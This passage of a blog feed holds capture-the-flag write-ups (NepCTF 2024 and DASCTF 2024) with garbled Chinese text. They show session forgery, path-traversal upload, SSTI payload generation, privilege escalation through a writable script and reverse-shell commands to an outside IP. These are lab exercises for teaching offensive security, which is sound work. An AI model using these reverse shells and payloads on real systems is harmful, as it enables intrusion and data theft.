string">'/force_buy_flag'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_buy_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session <span class="token keyword">or</span> session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"HRP"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Permission denied"</span><span class="token punctuation">,</span> <span class="token number">403</span>    target_user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"target_user"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> target_user <span class="token keyword">not</span> <span class="token keyword">in</span> users<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"User not found"</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">if</span> users<span class="token punctuation">[</span>target_user<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">>=</span> flag_price<span class="token punctuation">:</span>        users<span class="token punctuation">[</span>target_user<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">-=</span> flag_price        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"User </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_user<span class="token punctuation">&#125;</span></span><span class="token string"> successfully bought the flag!,"</span></span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"Here is your flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"User </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_user<span class="token punctuation">&#125;</span></span><span class="token string"> does not have sufficient funds"</span></span><span class="token punctuation">,</span> <span class="token number">400</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥å¼ºåˆ¶æŸä¸ªç”¨æˆ·è´­ä¹°flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/buy_flag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Not logged in"</span><span class="token punctuation">,</span> <span class="token number">403</span>    <span class="token keyword">if</span> users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">>=</span> flag_price<span class="token punctuation">:</span>        users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">-=</span> flag_price        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Here is your flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> <span class="token string">"Insufficient funds"</span><span class="token punctuation">,</span> <span class="token number">400</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡ªå·±ä¹°flagï¼Œæ˜æ˜¾é’±ä¸å¤Ÿ</p><p>çœ‹ä¸€ä¸‹&#x2F;adminåå°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token keyword">and</span> password <span class="token operator">==</span> users<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'admin_logged_in'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'admin_dashboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Invalid credentials"</span><span class="token punctuation">,</span> <span class="token number">401</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin_login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin/dashboard'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin_dashboard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin_logged_in'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>            <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'No selected file'</span>        filename <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">'File uploaded successfully'</span>    cmd_output <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> <span class="token string">'cmd'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">"lock.txt"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># æ£€æŸ¥å½“å‰ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨lock.txt</span>            cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                cmd_output <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                cmd_output <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            cmd_output <span class="token operator">=</span> <span class="token string">"lock.txt not found. Command execution not allowed."</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin_dashboard.html'</span><span class="token punctuation">,</span> users<span class="token operator">=</span>users<span class="token punctuation">,</span> cmd_output<span class="token operator">=</span>cmd_output<span class="token punctuation">,</span> active_tab<span class="token operator">=</span><span class="token string">"cmdExecute"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éœ€è¦ session é‡Œçš„ admin_logged_in ä¸º True</p><p>å¯ä»¥ç›´æ¥ä¼ªé€  session ç™»å½• admin åå°</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824170911351.png" alt="image-20240824170911351"></p><p><code>eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW5fbG9nZ2VkX2luIjp0cnVlfQ.Zsmizw.c7Mw-jnRnROmAaqnFf1CJkdqcys</code></p><p>è¿›åˆ°åå°dashboardï¼Œæœ‰ä¸‰ä¸ªåŠŸèƒ½</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824171056562.png" alt="image-20240824171056562"></p><p>å‘½ä»¤æ‰§è¡Œéœ€è¦åœ¨ç›®å½•ä¸‹æœ‰ lock.txt æ‰èƒ½ä½¿ç”¨</p><p>æ–‡ä»¶ä¸Šä¼ </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">UPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">'templates/uploads'</span>ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'txt'</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> UPLOAD_FOLDER<span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token keyword">and</span> filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">/</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>            <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'No selected file'</span>        filename <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">'File uploaded successfully'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨äº†<code>templates/uploads</code>ä¸‹ï¼Œæ²¡åšè·¯å¾„ç©¿è¶Šçš„è¿‡æ»¤</p><p>ç›´æ¥ä¸Šä¼ ç›®å½•ç©¿è¶Š</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824171947901.png" alt="image-20240824171947901"></p><p>ç„¶åå°±èƒ½å‘½ä»¤æ‰§è¡Œï¼Œå—¯å¾ˆå¥½æœç„¶æ²¡æƒé™è¯»flag</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824172137281.png" alt="image-20240824172137281"></p><p>çœ‹ä¸€ä¸‹ç”¨æˆ·åˆ—è¡¨</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824172852596.png" alt="image-20240824172852596"></p><p>æ—¢ç„¶æœ‰è´¦å¯†æˆ‘ä»¬å°±å¯ä»¥ç™»å½•è¿™äº›ç”¨æˆ·ç„¶åç›´æ¥è½¬è´¦ç»™HRPä¹°flag</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824172948421.png" alt="image-20240824172948421"></p><p>æ‹¿åˆ°adminçš„å¯†ç ï¼š<code>aJc2W3HMWvwoEd9</code></p><p>è²Œä¼¼æ²¡å•¥ç”¨</p><p>å¼¹ä¸ªshellå…ˆ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/115.236.153.177/30908 &lt;&amp;1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pythonèµ·ç»ˆç«¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åä¸€æ³¢å°è¯•findææƒæ“ä½œä¹‹åé¶æœºå´©äº†ï¼Œæµ‹è¯•äº†ä¸€ä¸‹å‘ç°ä¸èƒ½éå† &#x2F;sys ç›®å½•</p><p>æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸ªpwnæ–‡ä»¶ï¼Œdumpä¸‹æ¥çœ‹çœ‹</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824182008766.png" alt="image-20240824182008766"></p><p>start.shçš„å†…å®¹æ˜¯æ‰§è¡Œpwnæ–‡ä»¶</p><p><code>ps -ef</code>ä¸€ä¸‹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root           <span class="token number">1</span>       <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">14</span>:28 ?        00:00:00 /bin/sh <span class="token parameter variable">-c</span> <span class="token function">service</span> xinetd start <span class="token operator">&amp;&amp;</span><span class="token function">su</span> root <span class="token parameter variable">-c</span> <span class="token string">"/flag.sh"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">su</span> ctfuser <span class="token parameter variable">-c</span> <span class="token string">"python3 app.py"</span>root          <span class="token number">20</span>       <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">14</span>:28 ?        00:00:00 <span class="token function">su</span> ctfuser <span class="token parameter variable">-c</span> python3 app.pyctfuser       <span class="token number">21</span>      <span class="token number">20</span>  <span class="token number">0</span> <span class="token number">14</span>:28 ?        00:00:00 <span class="token function">sh</span> <span class="token parameter variable">-c</span> python3 app.pyctfuser       <span class="token number">22</span>      <span class="token number">21</span>  <span class="token number">2</span> <span class="token number">14</span>:28 ?        00:00:05 python3 app.pyroot          <span class="token number">24</span>       <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">14</span>:28 ?        00:00:00 /usr/sbin/xinetd <span class="token parameter variable">-pidfile</span> /run/xinetd.pid <span class="token parameter variable">-stayalive</span> <span class="token parameter variable">-inetd_compat</span> <span class="token parameter variable">-inetd_ipv6</span>ctfuser       <span class="token number">27</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">14</span>:29 ?        00:00:00 /bin/sh <span class="token parameter variable">-c</span> <span class="token assign-left variable">GZCTF_FLAG</span><span class="token operator">=</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> æˆ‘ä»¬çš„å‘½ä»¤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æƒ³åŠå¤©ä¼ äº†ä¸ªfscanæ‰«127.0.0.1ï¼Œå‘ç°å¼€ç€8888ç«¯å£ï¼Œ<code>xinetd.d</code>æ˜¯å¸¸è§çš„èµ· pwnserver æŒ‡ä»¤</p><hr><h2 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/22/environ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç›´æ¥è¯»èµ·webæœåŠ¡çš„é‚£ä¸ªpidçš„ç¯å¢ƒå˜é‡ï¼Œè¿™é‡Œæ˜¯22</p><p>å› ä¸ºflagç¯å¢ƒå˜é‡æ˜¯åœ¨åé¢æ‰§è¡Œå‘½ä»¤æ—¶è¢«æ¸…ç©ºçš„ï¼Œåªå¯¹å½“å‰ç»ˆç«¯ï¼ˆå¯¹åº”pid27ï¼‰æœ‰æ•ˆ</p><hr><h2 id="é¢„æœŸ-1"><a href="#é¢„æœŸ-1" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h2><p><code>ls -lh /etc/xinetd.d/</code>å‘ç°é‡Œé¢æœ‰ä¸ª pwnservice æœ‰å†™å…¥çš„æƒé™ï¼ŒæŸ¥çœ‹pwnserviceï¼ˆè¿™ä¸€æ­¥è·³äº†ï¼Œç›´æ¥ç”¨æ™¨æ›¦å¸ˆå‚…çš„å›¾ï¼‰</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240831123025845.png" alt="image-20240831123025845"></p><p>æ³¨æ„åˆ°é¶æœºé‡Œé¢æœ‰ncï¼Œ8888ç«¯å£ä¸Šæ˜¯ä¸ªpwnserverï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ncæœ¬åœ°çš„8888ç«¯å£</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">8888</span>/home/ctfuser/start.sh: line <span class="token number">2</span>: ./pwn: No such <span class="token function">file</span> or directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¯´æ˜è¿™é‡Œæ˜¯æ‰§è¡Œäº† &#x2F;home&#x2F;ctfuser&#x2F;start.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#/bin/bash</span>./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ³¨æ„åˆ° start.sh æœ‰å†™æƒé™ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°è¯•å†™å…¥æ¶æ„å‘½ä»¤ï¼Œç„¶åå†æ¬¡ncå°±å¯ä»¥æ”¹æƒé™äº†</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"#/bin/bash"</span><span class="token operator">></span>start.sh<span class="token builtin class-name">echo</span> <span class="token string">"chmod 777 /home/ctfuser/f*"</span><span class="token operator">>></span>start.sh<span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">8888</span><span class="token function">ls</span> <span class="token parameter variable">-lh</span><span class="token function">cat</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Always-RCE-Firstï¼ˆUnsolvedï¼‰"><a href="#Always-RCE-Firstï¼ˆUnsolvedï¼‰" class="headerlink" title="Always RCE Firstï¼ˆUnsolvedï¼‰"></a>Always RCE Firstï¼ˆUnsolvedï¼‰</h1><p>å‚è€ƒï¼š<a href="https://forum.butian.net/article/513">https://forum.butian.net/article/513</a></p><p>æœ‰javaä¸çœ‹ï¼ˆ</p><hr><h1 id="NepRouterï¼ˆUnsolvedï¼‰"><a href="#NepRouterï¼ˆUnsolvedï¼‰" class="headerlink" title="NepRouterï¼ˆUnsolvedï¼‰"></a>NepRouterï¼ˆUnsolvedï¼‰</h1><p>æœ‰äºŒè¿›åˆ¶ä¸çœ‹ï¼ˆ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;php masterï¼Œé™¤äº†phpå…¶å®ƒéƒ½ä¸ä¼šï¼ˆ&lt;/p&gt;
&lt;p&gt;å‚è€ƒwpï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://chenxi9981.github.io/NepCTF_2024/&quot;&gt;https://chenxi9981.github.io/NepCTF_2024/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://natro92.fun/posts/64a8e859&quot;&gt;https://natro92.fun/posts/64a8e859&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="ææƒ" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="SSTI" scheme="http://c1oudfl0w0.github.io/blog/tags/SSTI/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF2024å…«æœˆèµ›</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/24/DASCTF2024%E5%85%AB%E6%9C%88%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/24/DASCTF2024%E5%85%AB%E6%9C%88%E8%B5%9B/</id>
    <published>2024-08-24T02:40:52.000Z</published>
    <updated>2024-08-31T15:26:44.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç­¾å®Œåˆ°çœ‹åˆ°ä¸¤é“javaå°±è·‘å»æ‰“nepçš„å±‘ï¼ˆ</p><p>å®˜æ–¹wpï¼š</p><p><a href="https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/iavv2gfao7ea2buw?singleDoc#xwxbK">https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/iavv2gfao7ea2buw?singleDoc#xwxbK</a></p><span id="more"></span><hr><h1 id="Truman"><a href="#Truman" class="headerlink" title="Truman"></a>Truman</h1><p>è¿›å»ï¼Œå‘ç°æ˜¯ssti</p><p>fenjingç§’äº†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> functools<span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">from</span> fenjing <span class="token keyword">import</span> exec_cmd_payloadURL <span class="token operator">=</span> <span class="token string">"http://8bff7c8b-e015-472b-91ac-958ea57a03df.node5.buuoj.cn:81/"</span><span class="token decorator annotation punctuation">@functools<span class="token punctuation">.</span>lru_cache</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>payload<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># å¦‚æœå­—ç¬¦ä¸²så¯ä»¥é€šè¿‡wafåˆ™è¿”å›True, å¦åˆ™è¿”å›False</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.02</span><span class="token punctuation">)</span> <span class="token comment"># é˜²æ­¢è¯·æ±‚å‘é€è¿‡å¤š</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Oops"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    shell_payload<span class="token punctuation">,</span> will_print <span class="token operator">=</span> exec_cmd_payload<span class="token punctuation">(</span>        waf<span class="token punctuation">,</span> <span class="token string">'bash -c "bash -i >&amp; /dev/tcp/115.236.153.177/30908 0>&amp;1"'</span>    <span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> will_print<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"è¿™ä¸ªpayloadä¸ä¼šäº§ç”Ÿå›æ˜¾ï¼"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>shell_payload<span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/08/24/DASCTF2024%E5%85%AB%E6%9C%88%E8%B5%9B/image-20240824105011407.png" alt="image-20240824105011407"></p><hr><h1 id="Monument"><a href="#Monument" class="headerlink" title="Monument"></a>Monument</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ç­¾å®Œåˆ°çœ‹åˆ°ä¸¤é“javaå°±è·‘å»æ‰“nepçš„å±‘ï¼ˆ&lt;/p&gt;
&lt;p&gt;å®˜æ–¹wpï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/iavv2gfao7ea2buw?singleDoc#xwxbK&quot;&gt;https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/iavv2gfao7ea2buw?singleDoc#xwxbK&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>å·…å³°æå®¢2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/</id>
    <published>2024-08-17T02:03:16.000Z</published>
    <updated>2024-08-19T09:20:10.898Z</updated>
    
